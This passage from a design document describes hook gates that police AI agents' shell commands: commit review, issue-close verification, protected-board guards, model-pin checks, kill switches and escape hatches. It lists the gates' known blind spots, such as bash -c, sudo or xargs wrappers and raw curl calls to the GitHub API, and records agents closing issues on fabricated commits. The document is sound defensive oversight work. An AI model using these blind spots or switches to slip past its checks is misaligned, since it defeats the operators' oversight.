telemetry names a different path SET than the current `--paths` (order-independent) — a genuine
content difference there is already caught by the byte-identity check, but this catches outright
misuse (citing one review's key against a different `--paths` list) with a specific message; an
entry with no `paths=` field at all (pre-telemetry) is not checked. The ledger truncates `paths=` at
12 entries (`_MAX_PATHS_IN_FIELD`) and records the untruncated count separately as `paths_n=`. When
`paths_n` exceeds the cap, the check instead requires the stored (truncated) set to be a SUBSET of
the current set AND the current set's size to equal `paths_n` exactly: the subset half re-verifies
every path the ledger could store, and the count half is independently necessary, because a subset
check alone would accept a current set that adds an extra, never-reviewed path on top of the honest
truncated 12. When `paths_n` is absent, unparsable, or does not exceed the cap, the check is
exact-set equality against the complete stored set. `paths_n=` counts DISTINCT sanitized paths, not
the raw `--paths` count. Full mechanism, the digest-format-version (`dg=2`) and
control-character-safe-naming fixes, and the current directory/glob/magic-pathspec behavior:
`review-ladder.md`'s own `--rekey` section.

**`--correct-identity` (#5133, 2026-09-09):** a correction line can never change a commit's
outcome — it only ever rewrites which `reviewer=` value is on record for an already-clean/already-
blockers key, and is refused outright if combined with `--clean`/`--blockers`/`--pre-commit`. Gate
3b's own decision logic is therefore completely unchanged by its existence: `decide()` still only
ever asks "is there SOME outcome-bearing entry for this exact digest, and what does its outcome
say," and a correction line is just a later entry for a key gate 3b already resolves via
last-line-wins. Full mechanism: `review-ladder.md`'s own `--correct-identity` section.

### Gate 3c — `dirty_precommit_config`: stop a doomed commit before it leaks a claim

**Lives inside `pretooluse_bash.py` itself** (no separate module) — `_dirty_precommit_config_block()`
in `pretooluse_bash.py`. Added 2026-08-30 (#4670 item 3; landed and committed at
`bde4495`).

**The mechanism it closes:** a *pathspec* commit (`git commit -- <paths>`) builds a **temporary**
git index from HEAD plus only the named paths, and pre-commit diffs the working tree against
*that* temp index — not the real index. Since the temp index always carries HEAD's copy of
`.pre-commit-config.yaml` unless the commit's own pathspec names that file, an uncommitted edit
to the config (staged or not) always reads as "unstaged" to pre-commit's own config-staleness
check and the commit is *guaranteed* to fail — regardless of whether `git add
.pre-commit-config.yaml` was ever run (see `_precommit_config_dirty()` in `pretooluse_bash.py`, verified empirically per
the module).

**Why this needed its own gate:** #4670 measured 8 burned commit attempts in one night from
exactly this predictable, always-doomed failure — and worse, each failed attempt still took a
gate-4 file-claim (including the per-repo commit-mutex token) before failing, so a doomed retry
loop could wedge every other agent's commits in that repo. Gate 3c denies the commit **before**
gate 4 ever takes a claim for it (the 3c entry of the `pretooluse_bash.py` module docstring).

**Exemption:** when the commit's own pathspec already names `.pre-commit-config.yaml`
(normalized the same way gate 3b normalizes review targets, so `./`-prefixed and absolute
spellings are recognized), that commit's temp index *does* carry the fresh content and would
actually succeed — denying it anyway measurably wedges the repo with no sanctioned recovery
(`_pathspec_includes_precommit_config()` in `pretooluse_bash.py`).

**When not exempt, recovery is a genuine three-step chain** (not a single commit — a bare
config-only commit is itself denied by gate 3b, since a dirty config's own diff by definition
has no recorded review yet):
1. `python3 ~/.claude/hooks/record_review.py <repo> --pre-commit --clean --paths .pre-commit-config.yaml --reviewer <agent-type> --reviewer-agent-id <id> --reviewer-tool-use-id <id> < /dev/null`
   (the three `--reviewer*` fields are the reviewer's IDENTITY, copied from its dispatch row in
   `~/.claude/.agent_budget/spend.jsonl` — `agent_id` and `tool_use_id`, never retyped; the
   recorder joins `tool_use_id` to that ledger and writes `model=<tier> model_source=ledger`.
   Omitting them still records, but logs `missing-reviewer-identity` and proves nothing about
   which model reviewed.)
2. `git commit -m "chore: sync pre-commit config" -- .pre-commit-config.yaml`
3. Retry the original commit.

Fails open on any error. No escape hatch (`git_state=False`); rollback lever:
`CSA_NO_DIRTY_CONFIG_GATE=1`. Four narrower, documented-not-fixed gaps (glob pathspec, symlink
spelling, compound-segment granularity, no pre-commit-installed check) all fail toward an
*unnecessary deny*, never a false allow — see `_precommit_config_dirty()` in `pretooluse_bash.py` for the full
enumeration.

### Gate 4 — `file_claims`: contested-path check + the per-repo commit mutex

Covered in depth in `concurrency-and-claims.md`. Summarized here: checks the commit's target
paths against every *other* live agent's claim in `~/.claude/.file_claims/`, and — when a real
repo root resolved and the mutex isn't disabled — also claims a synthetic per-repo token so
"only one commit lands per repo at a time" is mechanical, not just a real-path check
(`_file_claim_block()` in `pretooluse_bash.py`). No escape hatch; rollback lever `CSA_NO_COMMIT_MUTEX=1`
(mutex only — real path-scoped claims are unaffected).

### Gate 5 — `gh_issue_close_gate`: refuses a fabricated-resolution close

**File:** `hooks/gh_issue_close_gate.py`. **Pure core:** `decide(event, ...)`. **Orthogonal** to gates 1–4/6 — it only fires on a
`gh issue close ...` command, never a `git commit`, so it can never collide with them on the
same segment (the 5 entry of the `pretooluse_bash.py` module docstring, and `_gh_issue_close_block()`).

Ported from `~/.claude/scripts/gh_issue.sh`'s `resolve` subcommand guard. Harvests every
resolving commit reference in the close (`--commit <sha>` flags, or free-form `Fixes #N
<sha>`/`Closes: <sha>`-style text bound to a sha via `_RESOLUTION_SHA_RE`
in `gh_issue_close_gate.py`) and refuses the close unless every cited sha resolves to a real
commit in the repo (`needs_block()`). **Parity note (2026-09-07, #5066):** the two guards have
since diverged deliberately — `gh_issue.sh resolve` gained `--evidence-repo <path>` (verifies the
cited shas against a NAMED local repo, for board issues whose fix legitimately lands in another
repo, stamping an explicit trailer into the close comment), while this hook deliberately did NOT:
it only ever sees a BARE `gh issue close` typed as the Bash command itself, never the close the
helper runs internally, so a helper-mediated `--evidence-repo` close is structurally out of its
sight and adding the concept here would guard nothing.

**Deploy-ancestry extension (2026-08-03):** "a commit exists somewhere in this repo" is a
materially weaker guarantee than "this reached where the close's own claim says it did" — the
motivating incident is named directly in the module: 34 QA-matrix rows were marked "verified"
staging-only (not actual prod ancestors) and had to be mass-retracted, and two GitHub issues
were closed-as-completed then reopened because their code had never reached any remote
(module docstring of `gh_issue_close_gate.py`). When the close's own text makes a deploy-status claim ("deployed
to prod" / "on staging", per this project's own status vocabulary), every cited commit must
*also* verify as a real ancestor of that claim's target ref via `git merge-base
--is-ancestor` (`needs_block_for_ancestry()` in `gh_issue_close_gate.py`). Target refs are
configurable per repo (`CSA_PROD_REF`/`CSA_STAGING_REF`). Prod defaults to `origin/main`
(`_DEFAULT_PROD_REF` in `gh_issue_close_gate.py`) when unset. Staging has **no default** — an
unset `CSA_STAGING_REF` resolves to `None`, and a `None` target ref is treated as "this claim isn't
actually checkable," degrading to no-claim-detected exactly like text with no deploy claim at all.
This is deliberate, not an oversight: a `HEAD` fallback would make the ancestry check vacuously true
for any commit already on the current branch, silently turning a staging claim into an
always-passing check (`target_ref_for_claim()` in `gh_issue_close_gate.py`).

**Sanctioned "not planned" bypass (2026-08-23):** a close may skip the fabricated-resolution
guard entirely when, in its *own* segment text, it cites zero resolving commits, makes no
deploy claim, carries `--reason "not planned"` (matched against the tokenized argv, not raw
text — a `--comment` body that merely *quotes* those words doesn't count,
`_argv_has_not_planned_reason()` in `gh_issue_close_gate.py`), or carries a structured `Disposition:` marker
(`duplicate-of #N`/`stale-superseded`/`wont-fix`). Every use of this bypass is logged
(`not-planned-exempt-allow`) so the enforcement log can answer "how often did the gate wave a
close through, and why."

### Gate 5b — `protected_board_guard`: denies adding an item to a PROTECTED board

**File:** `hooks/protected_board_guard.py`. **Pure core:** `decide(command, boards) -> (block,
reason)`. **Orthogonal** to every other gate — it fires on a `gh project item-add|item-create`, a
`gh api graphql` add-item/draft-issue mutation, a `gh issue|pr create/edit --project|--add-project`,
or a `gh_issue.sh --project` invocation, never a `git commit` or a `gh issue close`, so it can never
collide with any other gate on the same segment (`pretooluse_bash.py`'s `_protected_board_block`).

Added 2026-09-14 on operator directive (GH #5490): "make sure that only tickets from the saas
ticketing center go here... none of our agents should create issues here" — the product's customer
support-ticket board (a GitHub organization project; its number and node id are held in the registry described
below and are not repeated on this page) is a CUSTOMER-ONLY support-ticket inbox;
only the product's own support-ticket mirror may add items to it. This gate makes that mechanical
rather than a norm an agent might forget.

**Product-agnostic by design:** the set of protected boards lives in a registry,
`~/.claude/knowledge/protected_boards.json` (`{"boards": [{"owner", "number", "node_id", "title",
"reason", "tracker"}, ...]}`) — the runtime code never hardcodes a specific board id. Any repo can
protect a board by adding an entry.

**Denies four shapes**, each requiring the command to actually match a registered board (a
different project number, or the same number under an explicitly different owner, is unaffected):
  * (a) `gh project item-add|item-create <number> [--owner <owner>]` — an ABSENT `--owner` still
    matches (gh defaults to the authenticated org, which for a protected board's product repos IS
    that board's own owner — a caller cannot dodge the gate by omission).
  * (b) `gh api graphql` (or `gh api -X POST .../graphql`) whose text contains an
    `addProjectV2ItemById`/`addProjectV2DraftIssue` mutation TOGETHER WITH a protected `node_id` —
    a raw text scan, so a node id smuggled in only as an `-F`/`-f` variable value still matches.
  * (c) `gh issue create|edit` / `gh pr create` carrying `--project`/`--add-project` whose value
    equals a protected board's `title` (case-insensitive) or `number`.
  * (d) a `gh_issue.sh` invocation carrying `--project <number>` matching a protected board.

**Allows** everything else, in particular reads (`gh project view|item-list|field-list`), a
GraphQL QUERY that merely mentions the node id with no add mutation, `item-edit`/field updates on
an EXISTING item (triaging a customer ticket is legitimate steward work — only item CREATION is
denied), `item-delete`, and any operation on a different project.

**Untokenizable segments fail CLOSED** when the raw text carries both a `gh` mention and a
protected-board add shape (a protected node id, or `gh` + `project` + one of
`item-add`/`item-create`/`--add-project`/`--project`) — same posture as Gate 1's own
`untokenizable-segment-with-git`. **The registry fails OPEN**: a missing/unparseable/empty
`protected_boards.json` degrades to allow (logged) rather than wedging every `gh project` command
on the machine.

`bash_gate.sh`'s fast-path was extended with narrow arms (`*gh*project*`, `*addProjectV2*`,
`*--add-project*`, `*--project=*`, `*"--project"*`, `*gh*create*-p*`, `*gh*edit*-p*`) so a
protected-board-add attempt actually reaches the python dispatcher — see that script's own header
comment for why each arm is scoped the way it is.

**Known limits (deliberate, not a gap to silently close):** this gate covers the ergonomic `gh` /
`gh_issue.sh` paths an agent actually reaches for. It does NOT inspect a file-based GraphQL body
(`gh api graphql -f query=@file.graphql`, or `gh api --input body.json`), a raw HTTP client
(`curl`/`python -c ...` hitting `api.github.com` directly), `xargs`-indirected argv construction, or
a `gh alias` wrapping one of these shapes under a new name — all of that is the same "arbitrary HTTP
client" class no Bash-argv gate can fully close; it is closed by `agents/board-steward.md`'s prose
rule and the operator directive instead, not by mechanical inspection here. Separately: the board's
own legitimate writer — this product's support-ticket mirror — runs inside the deployed backend
service using its own service credentials, never through an agent's Bash tool call, so it is never
subject to (and never needs an exemption from) this gate at all.

### Gate 6 — `churn_tracker`: pure observer, never blocks

**File:** `hooks/churn_tracker.py`. Reached only when no earlier gate (1 through 5b) blocked. Records the
commit's target paths and current HEAD under `~/.claude/.churn/`, and logs a `churn-flagged`
decision the first time a path crosses the configured commits-without-a-clean-review threshold
within the configured window (the 6 entry of the `pretooluse_bash.py` module docstring, and `_churn_observe()`). It never returns a
block and has no enforcing()-gated hard-block path at all — it exists purely to make "which
paths keep landing changes without a real review" a measurable, logged fact rather than a
hunch. `CLAUDE.md` §7 counts eleven gates in this chain, ten of which can block; gate 6 is the one that structurally cannot.

### `issue_create_observer` — the issue-CREATION quality observer (#5827)

**File:** `hooks/issue_create_observer.py`. **Pure core:** `observe(command) -> list[(decision,
detail)]`. Added 2026-09-20 for the master plan's WS1 Phase D ("Creation quality gate + promotion
budget (observer-first)") — the mechanical instrument for a measured backlog problem (the measured figures are in History).

**Not part of the numbered gate table above, and not subject to "first block wins" at all** — it
has no block-shaped return value in the first place (unlike `churn_tracker`, which at least
*could* grow a hard-block path later; this module structurally cannot). `pretooluse_bash.py`'s
`resolve_block()` calls it unconditionally, first, before any of the numbered gates run — not
because it needs to win a precedence race (it can't block, so there's nothing to out-rank), but
so a `gh issue create` / `gh_issue.sh create` command is always observed regardless of what any
other gate decides about the same command.

**Two shapes observed, per Bash segment** (every segment in a compound command is inspected
independently — unlike a blocking gate, an observer has no reason to short-circuit on the first
match):
  * **(a) bare `gh issue create ...`** — any invocation that did NOT go through this runtime's own
    `~/.claude/scripts/gh_issue.sh` helper. Logged as `bare-issue-create`, carrying a redirect
    message naming the helper and its `--priority`/label flags.
  * **(b) `gh_issue.sh create ...`** (any path prefix; basename match) — inspected for
    `--priority` and the three label classes this board's taxonomy defines (one unprefixed `type`
    label — `bug`/`enhancement`/`feature`/`chore`/`epic`/`documentation` — at least one `area:`
    label, one `difficulty:` label; see `.claude/oversight/board-steward.md` §2 for the live
    taxonomy this mirrors). Missing `--priority` OR any label class logs
    `create-missing-triage-would-deny`, naming exactly which piece(s) are absent. A
    fully-compliant create logs nothing — silence is the expected, common case.

**Fail-AMBIGUOUS, never fail-CLOSED** — a deliberate reversal of every blocking gate's own
parse-ambiguity posture (gate 1's `untokenizable-segment-with-git`, gate 5b's
`untokenizable-segment-with-protected-board-shape`): those gates fail closed because an unparseable
wrapper around a dangerous shape is a real bypass vector *they* must not let through. This module
can never deny anything, so there is no bypass to close — an untokenizable segment that still
carries the textual shape of a `gh`/`gh_issue.sh` create invocation is logged as
`create-observer-ambiguous` (so the eventual false-positive audit can see how often ambiguity would
have been the deciding factor) but never treated as a reason to alter the command's outcome.

**Detection blind spots — named explicitly, since board-steward's 30-event audit needs its
denominator understood.** Each of these yields ZERO observations even though the underlying create
genuinely runs (confirmed by execution): `bash -c "gh issue create ..."` (embedded in a string
argument, never a literal argv token), `sudo gh issue create ...` (`sudo` is not a stripped
leading-invoker word — only `env`/`command` are), `xargs gh issue create ...` (the real flag values
arrive via a pipe on stdin, never as literal tokens in the command string this hook receives), and a
`for` loop whose body invokes `gh_issue.sh create` (shell control-flow tokens can desync the segment
splitter, and a loop-variable-interpolated flag value is never resolved by this static,
non-executing reader). Under-detection (a false negative) is the safe direction for a pure observer
that can never deny anything — the opposite (a false positive) is what the 30-event audit actually
screens for — but both matter to that audit's denominator, which is why both are named rather than
only the safe one.

**A `priority:` LABEL never satisfies the Priority FIELD requirement — deliberately, not by
mistake.** This board's own dossier (`.claude/oversight/board-steward.md` §2) rules fields are
truth, not labels — a `priority:` label is a legacy, being-retired convention on this board. A
create carrying `--label "priority: P1"` and no `--priority` flag is therefore flagged (`missing:
["priority"]`) on purpose; the audit must classify that class of create as genuinely missing its
Priority field.

**Never calls `_lib.emit_pretooluse_deny`** — the one fact that keeps `check_safety_core_parity.py`'s
guard-wiring self-check (see spec item 4 in that module's own docstring) from demanding this
module be reachable/wired as a real guard. It genuinely is wired (into `pretooluse_bash.py`'s
`resolve_block()`), but it is not a *guard* in that checker's sense, because it structurally
cannot deny.

**Two layers, one shared spec** (Layer 1 vs. Layer 2, per the master plan): this hook module is
Layer 2 — it observes the *Bash tool call itself*, so it fires for a bare `gh issue create` that
never goes anywhere near the helper at all. Layer 1 lives inside `scripts/gh_issue.sh`'s own
`create` subcommand: the SAME missing-priority/label check, logged as `create-missing-triage`
(both to stderr and, best-effort, to the SAME `~/.claude/.enforcement/log.jsonl` ledger, via an
inline `python3` one-liner mirroring `codex_review.sh`'s own JSONL-write convention) — and,
critically, **`create` still files the issue either way**; nothing is ever refused for a missing
piece during this observer-first window. The two layers are expected to agree in practice, but
Layer 1 fires even in a context the PreToolUse hook chain never sees (a unit test driving
`gh_issue.sh` directly, or `CSA_DISABLE_HOOKS=1`).

**`bash_gate.sh`'s fast-path was extended** with one narrow arm, `*gh*issue*create*` (it also covers `gh_issue.sh create` under any path prefix, because
that filename holds `gh` and then `issue`; a separate `*gh_issue.sh*create*` arm was removed as unreachable, with the
matched set unchanged) — mirroring the existing `*gh*issue*close*` arm's "all tokens present, in
order" narrowing (never a bare `*gh*`, which would spawn python for every payload merely
containing the substring "gh"). Without this, a bare `gh issue create` (no `git` token, no
`close`) would fall through the `*)` arm and exit 0 without ever invoking
`python3 pretooluse_bash.py` — this observer could never fire no matter what it was watching for,
the identical class of gap gate 5/gate 1c each closed for their own shapes in turn.

**Status: observer-only.** Both layers are pure observers; nothing here denies a creation for any
reason. Enforcement would be a separate, later change gated on real data. The plan's own bar:
board-steward audits a 30-event sample of what this observer *would* have denied; ≤3 false positives
clears the way for the enforcement change (architect + devops-architect rule), >3 means the
misclassified label/priority-detection classes get fixed and a fresh 30-event sample is drawn. Until
the enforcement change lands, `create-missing-triage` / `create-missing-triage-would-deny` /
`bare-issue-create` / `create-observer-ambiguous` are purely informational rows in
`~/.claude/.enforcement/log.jsonl`.

**Promotion budget (`scripts/issue_budget.py`, the second half of Phase D):** a separate,
read-only script — never invoked from this hook chain — that computes
`daily_promote_budget = max(5, round(completed_closes_trailing_14d / 14))`, counting only closes
whose GitHub `stateReason` is `COMPLETED` (`gh_issue.sh resolve`); `NOT_PLANNED` closes
(`gh_issue.sh dispose`) are reported separately and never summed into the budget. It promotes
nothing itself — Phase E's later, separate event-driven Ready-refill pass is the intended
consumer. The formula is deliberately self-referential-and-bounded (budget ← closes ← what was
promoted, floored at 5) — see the script's own module docstring for the architect's 30-day
re-scoring caveat.

## Sibling entry points: `PreToolUse:Task` and `PreToolUse:Workflow`

This page documents the **Bash** chain. Two other `PreToolUse` matchers are wired in
`settings.json` and are NOT part of it — neither is reachable from `pretooluse_bash.py`, and
neither needs a `STANDALONE_GUARD_MODULES` declaration in `check_safety_core_parity.py`,
because that checker walks every command wired in `settings.json` and both are directly wired.

- **`PreToolUse:Task` → `pretooluse_task.py`** — gates every sub-agent DISPATCH: T1
  `model_pin_gate.py` (agent-pin enforcement against `knowledge/model_policy.json`), then T2
  `agent_budget.py gate` (the concurrency pacer) only if T1 allows. See `CLAUDE.md` §7's own
  paragraph and `hooks/agent_pacer.md`.

- **`PreToolUse:Workflow` → `workflow_model_gate.py` (added 2026-09-23)** — denies a `Workflow`
  call whose `agent()` sites do not name a `model:`. **Why it exists:** a Workflow `agent()` with
  no `model:` inherits the MAIN SESSION's model, and Workflow legs reach *neither* of the gates
  above — `model_pin_gate` governs `Task` dispatches only, and Workflow legs never appear in
  `.agent_budget/spend.jsonl`, so the pacer ceiling and every spend audit are blind to them.
  A prose-only rule on a Workflow script's largest agent population is the known weak shape in this
  runtime; that is the same argument that motivated `check_workflow_agent_purity.py`. The measured incident
  behind this gate is recorded in History.

  It checks only that a model is NAMED, never which one — `_ALLOWED_MODELS` (the purity checker's
  `{"sonnet"}`-only value check) is deliberately not applied, since `'opus'` on a judge stage is
  legitimate. It does **not** parse JS itself: it calls
  `check_workflow_agent_purity.find_agent_call_sites()`, which strips comments before locating
  call sites, scans the original source for balanced parens (string-aware), and reads `model:` out
  of the trailing options object only.

  **That delegation is load-bearing, not a style choice.** A hand-rolled scanner is the wrong tool
  here: it can deny scripts that name `model:` correctly and can allow a nested schema property that
  merely happens to be named `model`, and the sibling checker already solves both cases. If the
  scanning needs to change, change it in `check_workflow_agent_purity.py` so both consumers get the
  fix; `hooks/tests/test_workflow_model_gate.py` pins every one of those shapes, and its
  `test_real_workflow_scripts_are_allowed` case runs the gate against whatever `.js` files actually
  live in `~/.claude/workflows/` so a regression fails loudly instead of silently re-blocking the
  wheel.

  **Accepted bypass:** a call whose options are not a self-contained object literal —
  `agent(opts)` or `agent({...base})` — is ALLOWED, not denied, because `model` may legitimately
  be set somewhere a literal-key check cannot see. Denying there would block compliant scripts
  with a message telling the author to add something they already added.

  Fails OPEN on every parse/IO error; honors `CSA_DISABLE_HOOKS=1` before any parse; logs both
  `deny` and log-only `would-deny` rows to `.enforcement/log.jsonl` via `_lib.log`. Note it does **not** get an observer-first shakedown period: wherever enforcement is on (see
  "Enforcement-state mechanics: `enforcing()`") it denies from the moment it lands; otherwise it logs
  would-deny rows.

## Fail-closed vs. fail-open — and where each applies

The overwhelming default across this whole chain is **fail open**: an unresolvable repo, an
unreadable ledger, a git subprocess timeout, or any unexpected exception degrades to *allow*.
This is a deliberate, repeated design choice, stated identically in nearly every module's
docstring — a crashing or misbehaving safety hook must never be worse than no hook at all,
because that would either wedge every agent in the tree or (under log-only mode) simply hide the
failure. `resolve_block()` itself is wrapped in a blanket `try/except` that returns "no block" on
any internal error (see `resolve_block()` in `pretooluse_bash.py`).

The narrow, deliberate exceptions where the chain fails **closed** instead:

- **Parse ambiguity in gates 1, 1c, and 2.** A command segment that mentions the literal word
  "git" (gates 1/2) or "gcloud" (gate 1c) but can't be tokenized (unbalanced quoting) is treated
  as a block candidate, not silently allowed — this is the one place where "I can't tell what
  this does" is treated as "assume the worst," because the alternative is a trivially exploitable
  bypass (wrap the dangerous verb in something the tokenizer chokes on)
  (`_evaluate_git_argv()` in `block_branch_ops.py`, `git_segments()` in `_lib.py`, `block_gcloud_identity.py`'s own
  `_gcloud_segments`/`untokenizable-segment-with-gcloud`).
- **Unparseable hook payload (`parse-error-with-git-token` / `parse-error-with-gcloud-token`).** If
  the hook's own JSON payload cannot be parsed, the dispatcher (`main()` in `pretooluse_bash.py`)
  cannot tell what command was about to run, so it reads the raw text instead: a whole-word `git`
  mention is denied as `parse-error-with-git-token`, otherwise a `gcloud` mention is denied as
  `parse-error-with-gcloud-token`, and a payload mentioning neither is allowed. Both are git-state
  blocks, so the operator escape hatch (below) applies, and, like every block, they deny only when
  enforcement is on. `CSA_DISABLE_HOOKS=1` is checked before any of this.
- **`run-path-too-ambiguous` in gate 1c.** The walk that reads a `run` command's verb path past
  group-level flags gives up once it exceeds 64 readings (`_MAX_PATH_VARIANTS`), which typically
  happens when many unrecognized flags precede the verb. It then denies the command as
  `run-path-too-ambiguous`, but only when the argv literally contains a covered keyword (`services`,
  `jobs`, `revisions`, `worker-pools` or `configurations`, the second elements of the covered `run`
  describe/list groups). A `run` command whose argv contains none of those keywords (such as a
  `deploy` padded with flags) cannot match a covered family and is allowed whatever the flag count.
  The `--flag=value` spelling removes the ambiguity.
- **Truncated scans and unterminated quotes in gate 1c.** The scan that collects every gcloud-shaped
  token in an argv is capped (`_MAX_GCLOUD_SLICES`, 16); if it hits the cap with argv left to
  examine, the command is denied as `untokenizable-segment-with-gcloud` rather than evaluating only
  a partial list. An unterminated single quote makes the quote scanner (`_single_quoted_spans`)
  return nothing to skip, so the substitution scan covers the whole text instead of a false quote
  span swallowing every later `$(...)` or backtick.
- **Untokenizable segments in gate 5b.** A segment that mentions `gh` (or a `gh_issue.sh`-shaped
  call) but cannot be tokenized, and whose raw text carries a protected-board add shape (a protected
  node id, or `gh` + `project` + one of `item-add`/`item-create`/`--add-project`/`--project`), is
  denied as `untokenizable-segment-with-protected-board-shape`. Any other untokenizable segment is
  allowed, since there is nothing to act on. The registry itself fails open: a missing, unparseable
  or empty `protected_boards.json` allows.
- **`unresolvable-pathspec` in gate 3b.** A pathspec token the hook cannot resolve to real
  content (an unexpanded shell variable, an unquoted command substitution, a leading `~`) is
  refused outright and can never be cleared by recording a review — allowing it through would
  mean reviewing a digest of the *wrong* content.
- **`pathspec-env-set` in gate 3b (GH #5886).** One of
  `GIT_LITERAL_PATHSPECS`/`GIT_GLOB_PATHSPECS`/`GIT_NOGLOB_PATHSPECS`/`GIT_ICASE_PATHSPECS` present
  in the hook's own process environment is refused outright and can never be cleared by recording a
  review, for the identical reason as `unresolvable-pathspec` above — with the var set, the hook
  cannot trust its own digest computation to mean the same thing the real commit will do, so
  reviewing that digest would again mean reviewing a digest of the *wrong* content. See the
  `--rekey` subsection above for what this does and does not close: the check fires only when the
  variable is already present in the hook process's OWN inherited environment at the moment it runs
  — never anything set by the gated command itself (an inline prefix, an `export`, `env`, or `set
  -a`, whether typed before or in the same shell invocation as the commit). The PreToolUse hook runs
  as a separate process from the Bash tool's shell and only ever sees the environment it was
  launched with, not anything a gated command assigns, exports, or persists at run time. This is the
  issue #5892 class in full, not a narrower "inline only" gap.
- **The inline escape-var tripwire.** A command string that itself contains
  `CSA_ALLOW_GIT_STATE_OPS` is denied unconditionally, regardless of what the hook's own
  environment says — the escape hatch can rescue an *environment-set* override, never a
  *command-smuggled* one.
- **`rekey-root-digest-format-stale` in `record_review.py --rekey` (GH #5886; not one of gate 3b's
  own reasons — this is `record_review.py`'s own refusal, but the same "no amount of recording
  clears this" shape).** A `--rekey` whose chain root carries no `dg=2` field refuses outright — the
  root's digest may have been computed under the rendering that preceded control-character-safe
  naming, which cannot distinguish a single oddly-named reviewed entry from fabricated content, so
  no amount of re-attempting `--rekey` against that same root can ever clear it; the only path
  forward is a fresh `--pre-commit` review of the current content.
- **`rekey-lossy-material` in `record_review.py --rekey` (GH #5886; also not one of gate 3b's own
  reasons, same "own refusal, same shape" note as above).** A `--rekey` whose reconstruction hit ANY
  of the four lossy/ambiguous conditions in the lossless-material check above (a read-truncated
  file, invalid UTF-8, the aggregate-size-or-readable-file-count cap, or an unreadable file) refuses
  outright, REGARDLESS of whether the reconstructed digest happens to match the prior one — a
  matching digest built from lossy material proves nothing, so re-attempting the identical `--rekey`
  call can never clear it either; the only path forward is a fresh `--pre-commit` review of the
  current content, same as `rekey-root-digest-format-stale` above.

## The escape hatch mechanism

`CSA_ALLOW_GIT_STATE_OPS=1`, set only in the hook process's own environment (never derivable
from the command string), lets a gate-1/gate-1b/gate-1c/gate-2 git-state (or gcloud-identity)
block through — `block_gcloud_identity.py` reuses this exact same variable name (see
`block_gcloud_identity.ESCAPE_VAR`) rather than minting a new one, since a gcloud identity
mutation is the same class of operator-only machine-state override as a git-state mutation. This
is the *only* escape hatch in the whole chain — gates 3/3b/3c/4/5/5b have no escape hatch at all; gates 3, 3b, 3c and 4 have only their own
per-gate rollback env vars (`CSA_NO_REQUIRE_PATHSPEC`, `CSA_NO_PRECOMMIT_REVIEW`,
`CSA_NO_DIRTY_CONFIG_GATE`, `CSA_NO_COMMIT_MUTEX` respectively), and gates 5 and 5b have only the global
`CSA_DISABLE_HOOKS=1` kill-switch — because bypassing those specific
protections (path scoping, review, the config-staleness pre-check, the commit contest) would
defeat the entire point of them, the same choice `check_staged_scope` made from the start.
`CLAUDE.md` §7 describes this as "deliberate, single-command, operator-scoped... there is no
standing bypass" — in practice this means an operator sets the var for exactly one Bash
invocation, never as a persisted session/shell default.

## Enforcement-state mechanics: `enforcing()`

`_lib.enforcing(cwd=None)` is the single source of truth every gate consults for "should a real
deny be emitted, or only logged" (`enforcing()` in `_lib.py`). Precedence, evaluated in order:

1. `CSA_DISABLE_HOOKS=1` (the master-off switch) → **False**, unconditionally, before anything
   else is even checked (`disabled()` in `_lib.py`). **Scope note:** this is specific to
   the `PreToolUse:Bash` Claude-Code harness chain documented on this page. The separate, real
   `git commit` hook at `hooks/pre_commit_ratchet.py` (installed as `.git/hooks/pre-commit`, not
   a Claude Code harness hook and not built on `_lib.enforcing()` at all) deliberately does
   **not** give `CSA_DISABLE_HOOKS=1` this same unconditional reach as of THE ISSUE WHEEL
   hardening plan's H5 (2026-09-09): its workflow-agent-purity check is unwaivable and runs
   regardless of that variable, specifically so an unattended session cannot use it to land an
   impure Workflow script. Every other check inside `pre_commit_ratchet.py` still honors
   `CSA_DISABLE_HOOKS=1` as a short-circuit, unchanged. Do not assume the two systems' identical
   env-var name implies identical behavior.
2. env `CSA_ENFORCE=1` → **True**.
3. The global marker file `~/.claude/.enforce` exists → **True**.
4. Walking up from `cwd` (defaulting to the process's own `os.getcwd()`): the **first** ancestor
   directory containing a `.git` entry that *also* has a sibling `.claude/.csa-enforce` marker →
   **True**. The walk stops at the first `.git` it finds, mirroring the original bash
   implementation's `break` (`_project_enforced()` in `_lib.py`).
5. Otherwise → **False** (log-only).

When the global marker exists, enforcement is on for every repo on the machine (unless
`CSA_DISABLE_HOOKS=1` is set, which wins over everything), and per-project `.claude/.csa-enforce`
markers are never consulted, because step 3 short-circuits before step 4 runs. This is a deliberate
choice: the unattended oversight wheel's safety model needs live gates, and the cost of review is
controlled by proportional review (the risk-tier ladder in `review-ladder.md`), not by removing
gates.

**Log-only mode**, when it does apply (marker absent, no `CSA_ENFORCE`, no matching project
marker), never delays or blocks anything — a would-block is recorded to the log and the command
proceeds. This is deliberate: it lets the operator observe what *would* have fired, in a fresh
repo or a deliberately-relaxed one, without the gate actually costing anything.

## The decision log

Every gate's decision — allow, would-block, deny, escape-allowed — is appended as one JSON line
to `~/.claude/.enforcement/log.jsonl` via `_lib.log(hook, decision, **fields)`. The `enforce` field on each line always reflects the *real* `enforcing()`
outcome for that event's own cwd (not a bare no-arg call, which would silently read the
process's cwd instead — see the `pretooluse_bash.py:_finish()` comment about this exact footgun), so the log can be trusted to say whether a given would-block was
actually enforced.

Two example rows, produced by the gate's own test suite against a throwaway repo (so the `repo`
field shows a pytest temporary path), showing gate 5 denying under enforcement:

```json
{"ts": "2026-08-30T19:10:17Z", "hook": "gh_issue_close_gate", "decision": "deny", "enforce": true,
 "reason": "commit 'deadbeef...' not found in this repo — refusing to close (fabricated-resolution guard).",
 "command": "gh issue close 5 --comment 'Fixes deadbeef...'",
 "repo": ".../pytest-of-user/pytest-209/test_e2e_fake_sha_blocks_under0/repo"}
```

```json
{"ts": "2026-08-30T19:10:17Z", "hook": "gh_issue_close_gate", "decision": "deny", "enforce": true,
 "reason": "commit '9520478...' is not an ancestor of 'master' — the close claims prod status but this
            commit has not actually reached master (deploy-ancestry guard).",
 "deploy_claim": "prod", "target_ref": "master",
 "repo": ".../pytest-of-user/pytest-209/test_e2e_prod_claim_non_ancest0/repo"}
```

Logging itself is best-effort and swallows any failure (unwritable dir, unencodable field) —
logging must never be the thing that breaks a hook (`log()` in `_lib.py`).

## Per-gate rollback levers (summary)

Each gate that can independently wedge a commit has its own operator lever, distinct from the
global `CSA_DISABLE_HOOKS=1` kill-switch (which turns off *every gate in this chain*, including
branch-op and unscoped-commit protection — see the scope note under "Enforcement-state mechanics"
above: the separate real-git `pre_commit_ratchet.py` hook does not extend this same unconditional
reach to its workflow-purity check):

| Gate | Env var | Effect |
